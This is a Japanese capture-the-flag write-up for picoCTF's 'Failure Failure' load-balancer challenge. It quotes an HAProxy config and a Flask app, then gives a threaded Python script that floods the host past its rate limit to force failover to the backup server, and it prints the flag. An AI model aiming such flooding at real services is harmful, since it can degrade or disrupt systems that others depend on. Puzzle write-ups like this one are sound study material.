## category
General skills
## probrem
Welcome to Failure Failure — a high-available system.

This challenge simulates a real-world failover scenario where one server is prioritized over the other.

A load balancer stands between you and the truth — and it won't hand over the flag until you force its hand.
## 難しさ
普通
## 解法
現状としてHAproxyとapp.pyのwebアプリがあります。
まずproxyを見ていく。
```
backend servers
    option httpchk GET /
    http-check expect status 200
    server s1 *:8000 check inter 2s fall 2 rise 3
    server s2 *:9000 check backup inter 2s fall 2 rise 3
```
これはプロキシが自動的にサーバーにgetリクエストを二秒間間隔で送って状態を確かめる際の設定です。
通常はs1ですが200以外のステータスコードがかえってきてfallが二回続くとs2へ移行します。
つぎにapp.pyの設定を見てみます。
```
from flask import Flask, render_template
from dotenv import load_dotenv
from flask_limiter import Limiter
import os

load_dotenv()

app = Flask(__name__)

# Custom key function for global rate limiting
def global_rate_limit_key():
    return "global"

# Initialize rate limiter with global key function
limiter = Limiter(
    key_func=global_rate_limit_key,
    app=app,
    default_limits=["300 per minute"]
)

# Custom error handler for rate limit exceeded
@app.errorhandler(429)
def ratelimit_exceeded(e):
    return "Service Unavailable: Rate limit exceeded", 503

@app.route('/')
@limiter.limit("300 per minute")
def home():
    print("value:", os.getenv("IS_BACKUP"))
    if os.getenv("IS_BACKUP") == "yes":
        flag = os.getenv("FLAG")
    else:
        flag = "No flag in this service"
    return render_template("index.html", flag=flag)

```
limiterの制限が一分間に300回です。
そしてback_upがyesになるとフラグがゲットできます。
つまりs2のバックアップが起動。なのでやることとしては
s1に300回を超えるリクエストでダウン。
そしてちょうどs2に切り替わるタイミングを狙ってリクエストを送る。
なのでpythonで自動処理を構築して送る。
```
import requests
from concurrent.futures import ThreadPoolExecutor


url="http://mysterious-sea.picoctf.net:65062/"

def req(_):
        try:
            response = requests.get(url,timeout=5)
            return response
        except:
            return None

while quit:
    with ThreadPoolExecutor(max_workers=101) as executor:
        responses = list(executor.map(req,range(300)))
    if "picoCTF" in requests.get(url).text:
        print(requests.get(url).text)
        quit = False
```
## 使用コマンド
## 答え
```picoCTF{f41l0v3r_f0r_7h3_w1n_3df7bad5}```
## ここから学んだこと
サーバー系の問題はタイミングを絞ってループさせて攻撃しないと確実に得られない。
リミット制限では時間間隔などの設定がわからないためひたすら送るしかない。
## つぎに考えること
一撃でフラグをゲットする方法を考えてみる。

